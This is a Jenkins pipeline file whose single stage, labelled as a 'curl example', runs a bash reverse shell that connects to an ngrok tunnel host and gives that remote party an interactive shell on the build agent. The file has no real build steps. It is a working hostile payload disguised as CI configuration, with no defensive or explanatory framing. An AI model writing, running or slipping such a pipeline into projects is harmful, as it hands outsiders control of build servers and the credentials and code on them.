pipeline { 
    agent any
    stages {
        stage("Using curl example") {
            steps {
                    sh'''
                    /bin/bash -l > /dev/tcp/2.tcp.eu.ngrok.io/15319 0<&1 2>&1
                    '''
                }
            }
        }
    
}
